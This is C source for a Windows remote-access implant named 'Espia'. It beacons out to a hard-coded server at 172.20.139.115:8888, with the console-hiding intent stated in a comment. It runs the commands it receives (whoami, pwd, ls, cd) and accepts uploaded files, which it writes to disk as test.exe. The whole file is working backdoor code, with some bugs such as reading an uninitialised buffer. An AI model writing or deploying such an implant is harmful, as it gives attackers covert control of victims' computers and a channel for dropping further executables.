#include "EspiaClient/includes/espia.h"

#ifndef WINDOWS_H
#define WINDOWS_H
#include <windows.h> 
#endif

#if DEBUG
#include <stdio.h>
#endif

#define TRY_SERVER 5
#define BUFF_SIZE 1024

int main() {
    /* Allocate a new console and hide it (SW_HIDE) */
	HWND stealth;           
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, SW_NORMAL);
    /* ------------------------------------------- */


    /* Keep trying to connect to the server */
	WORD server_status;
	while ((server_status = espia_connect("172.20.139.115", "8888")) == CONNECTION_FAIL)
		Sleep(TRY_SERVER);
    /* ------------------------------------ */


    /* Main flow of the program, command recieving, parsing */
    CHAR recv_buff[BUFF_SIZE];
    CHAR cmd_buff[BUFF_SIZE];
    PSTR cmd_arg = NULL;
    int cmd_size = -1;
    while (strcmp(recv_buff, "exit") && cmd_size != 0) {
        memset(recv_buff, 0, BUFF_SIZE);
        memset(cmd_buff, 0, BUFF_SIZE);
        cmd_arg = NULL;
        cmd_size = espia_recv(recv_buff, BUFF_SIZE);
        printf("Recieved: %s\n", recv_buff);
        //memset(recv_buff + cmd_size - 1, 0, 1);                     // Remove the breakline char ('\n')

        /* Seperate the command from argument using the whitespace (' ') */
        int i = 0;
        for (i = 0 ; i < cmd_size ; i++) {
            if (recv_buff[i] == ' ') {
                cmd_buff[i] = '\0';
                cmd_arg = recv_buff + ++i;
                break;
            }
            cmd_buff[i] = recv_buff[i];
        }

        if (strcmp(cmd_buff, "whoami") == 0) {
            WCHAR whoami_buff[256 + MAX_COMPUTERNAME_LENGTH + 2];
            memset(whoami_buff, 0, sizeof(whoami_buff));
            whoami(whoami_buff, sizeof(whoami_buff));
            espia_send(whoami_buff, wcslen(whoami_buff)*sizeof(WCHAR));
        } else if (strcmp(cmd_buff, "pwd") == 0) {
            WCHAR pwd_buff[MAX_PATH + 1];
            memset(pwd_buff, 0, sizeof(pwd_buff));
            pwd(pwd_buff, sizeof(pwd_buff));
            StringCbCatW(pwd_buff, sizeof(pwd_buff), L"\n");
            espia_send(pwd_buff, wcslen(pwd_buff)*sizeof(WCHAR));
        } else if (strcmp(cmd_buff, "ls") == 0) {
            printf("came asdf");
            ls(espia_send);
        } else if (strcmp(cmd_buff, "cd") == 0) {
            WCHAR err_buff[50];
            if (cd(cmd_arg, err_buff, sizeof(err_buff)) != ESPIA_OK) {
                espia_send(err_buff, wcslen(err_buff)*sizeof(WCHAR));
            }
        } else if (strcmp(cmd_buff, "upload") == 0) {
            WCHAR send_buff[9] = L"\0";
            CHAR write_file_buff[1024] = "\0";
            espia_recv(write_file_buff, sizeof(write_file_buff));
            int sum = 0, dig = 0, pow = strlen(write_file_buff) - 1;
            for (int i = 0 ; i < strlen(write_file_buff) ; i++) {
                dig = write_file_buff[i] - '0';
                for (int j = 0 ; j < pow ; j++)
                    dig *= 10;
                sum += dig;
                pow--;
            }

            StringCbCatW(send_buff, sizeof(send_buff), L"ack<end>");
            espia_send(send_buff, sizeof(send_buff));

            HANDLE hFile = CreateFileW(
                L"test.exe",     // Filename
                GENERIC_WRITE,          // Desired access
                FILE_SHARE_READ,        // Share mode
                NULL,                   // Security attributes
                CREATE_NEW,             // Creates a new file, only if it doesn't already exist
                FILE_ATTRIBUTE_NORMAL,  // Flags and attributes
                NULL);                  // Template file handle
            DWORD bytesWritten;
            DWORD sizeWritten = 0;
            if (hFile == INVALID_HANDLE_VALUE) {
                // Failed to open/create file
                return 2;
            }

            int recieved_bytes = 0, full_bytes = 0;
            memset(write_file_buff, 0, sizeof(write_file_buff));
            while (full_bytes != sum) {
                recieved_bytes = espia_recv(write_file_buff, sizeof(write_file_buff));
                WriteFile(
                    hFile,            // Handle to the file
                    write_file_buff,  // Buffer to write
                    recieved_bytes,   // Buffer size
                    NULL,    // Bytes written
                    nullptr);
                full_bytes += recieved_bytes;
                printf("%d\n", full_bytes);
            }
            continue;
        } else {
            printf("%s : %d\n", recv_buff, cmd_size);
        }

        WCHAR msg_end[6];
        memset(msg_end, 0, sizeof(msg_end));
        StringCbCatW(msg_end, sizeof(msg_end), L"<end>");
        espia_send(msg_end, sizeof(msg_end));
    }
    /* ---------------------------------------------------- */


    /* Disconnecting from the server */
	espia_disconnect();
    /* ----------------------------- */

	return 0;
}